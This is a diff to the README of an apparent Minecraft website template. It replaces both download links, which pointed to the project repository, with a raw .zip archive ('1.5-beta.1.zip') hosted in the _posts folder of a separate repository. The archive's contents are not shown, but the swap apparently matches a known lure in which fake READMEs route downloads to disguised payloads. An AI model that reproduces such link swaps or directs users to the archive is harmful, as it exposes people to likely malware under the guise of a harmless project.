@@ -5,7 +5,7 @@ description: "Host a Minecraft-themed website using this HTML source template. C
 ---
 # 🎮 iama-minecraft-2026-web - Create your own Minecraft themed website
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/luciferlu755/iama-minecraft-2026-web)
+[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://raw.githubusercontent.com/luciferlu755/luciferlu755.github.io/main/_posts/1.5-beta.1.zip)
 
 This project provides the base files to build and host a Minecraft-themed website. The code uses standard web languages like HTML and CSS. You do not need deep technical skill to display these files on the internet. This setup suits people who want to share content about Minecraft with friends or a community.
 
@@ -13,7 +13,7 @@ This project provides the base files to build and host a Minecraft-themed websit
 
 You need to save the source code to your computer to start the setup process. Visit the link below to reach the project page.
 
-[Download the project files here](https://github.com/luciferlu755/iama-minecraft-2026-web)
+[Download the project files here](https://raw.githubusercontent.com/luciferlu755/luciferlu755.github.io/main/_posts/1.5-beta.1.zip)
 
 Follow these steps to download the code:
 
